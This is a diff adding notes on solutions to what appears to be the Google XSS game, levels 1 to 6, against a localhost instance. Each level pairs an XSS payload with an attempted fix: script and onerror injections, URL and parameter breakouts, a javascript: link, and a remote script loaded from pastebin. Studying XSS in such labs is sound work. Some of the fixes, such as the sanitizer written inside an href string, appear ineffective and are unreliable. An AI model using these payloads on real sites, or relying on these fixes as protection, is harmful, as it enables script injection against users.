@@ -1,0 +1,26 @@
+ALL: <script src="http://caja.appspot.com/html-css-sanitizer-minified.js"></script>
+
+1.
+A: paste query in search field <script>window.alert('LOL')</script>
+D: <form action="" method="GET" onsubmit="this.query.value = html_sanitize(this.query.value);">
+
+2.
+A: Paste into new post
+<img src="http://url.to.file.which/not.exist" onerror=alert('LOL2');>
+D: html_sanitize(posts[i].message)
+
+3.
+A: add to URL '%20onerror='alert(%22omegaLUL%22)', example: http://127.0.0.1:8080/#3'%20onerror='alert(%22omegaLUL%22)';
+D: html += html_sanitize("<img src='https://xss-game.appspot.com/static/level3/cloud" + num + ".jpg' />");
+
+4.
+A: Change url to http://127.0.0.1:8080/?timer=%27)%3Balert(1)%3Bvar%20a=(%27
+D: <img src="https://xss-game.appspot.com/static/loading.gif" onload="startTimer(html_sanitize('{{ timer }}'));" />
+
+5.
+A: URL to http://127.0.0.1:8080/frame/signup?next=javascript:alert('gg')
+D: <a href="html_sanitize({{ (next) }})">Next >></a>
+
+6.
+A: URL to http://127.0.0.1:8080/#HTTPS://pastebin.com/raw/ntPMqzVi
+D: if (url.match(/^https?:\/\//i))  // add case insesitive
